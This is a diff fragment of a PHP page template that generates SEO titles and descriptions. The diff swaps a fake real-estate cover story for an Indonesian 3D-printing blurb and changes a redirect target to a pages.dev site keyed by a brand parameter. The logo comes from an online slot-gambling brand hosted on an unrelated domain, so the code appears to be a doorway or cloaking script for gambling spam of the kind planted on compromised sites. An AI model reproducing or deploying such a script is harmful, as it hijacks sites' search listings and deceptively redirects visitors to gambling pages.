@@ -62,14 +62,14 @@
         $current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
         // SEO DATA (AUTO GENERATE)
-        $title = "$BRAND : Ito Girard & Associates Pengembang Properti San Diego";
+        $title = "$BRAND : Mengenal Teknologi 3D Printing dan Additive Manufacturing";
 
-        $description = "$BRAND Ito Girard & Associates adalah pengembang real estat urban San Diego dengan pengalaman sejak 2004 dalam pengembangan hunian investasi dan properti komunitas.";
+        $description = "$BRAND menjadi istilah yang erat dengan perkembangan teknologi manufaktur digital, prototyping, desain produk, dan additive manufacturing. Teknologi 3D printing memungkinkan sebuah objek tiga dimensi dibuat berdasarkan data digital dengan menambahkan material secara bertahap hingga membentuk produk sesuai rancangan.";
         
-        $artikel = "Ito Girard & Associates adalah pengembang real estat urban San Diego dengan pengalaman sejak 2004 dalam pengembangan hunian investasi dan properti komunitas.";
+        $artikel = "menjadi istilah yang erat dengan perkembangan teknologi manufaktur digital, prototyping, desain produk, dan additive manufacturing. Teknologi 3D printing memungkinkan sebuah objek tiga dimensi dibuat berdasarkan data digital dengan menambahkan material secara bertahap hingga membentuk produk sesuai rancangan.";
 
         // Bisa diganti random image atau CDN sendiri
-        $image = "https://i.pinimg.com/1200x/78/7d/f0/787df0cc9c08b0182874b2872dd14205.jpg";  
+        $image = "https://i.pinimg.com/1200x/90/54/c9/9054c978f92f14c76decea65cd580951.jpg";  
 
         // Canonical URL
         $canonical = $current_url;
@@ -79,7 +79,7 @@
     }
 
     // Redirect target
-    $ampmek = "https://itogirard.pages.dev/?id=$BRAND";
+    $ampmek = "https://3d-print-lab.pages.dev/?id=$BRAND";
     $logo = "https://www.residentviews.com/assets/logo/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
     $favicon = "https://www.gstatic.com/search-console/scfe/favicon.png";
     ?>
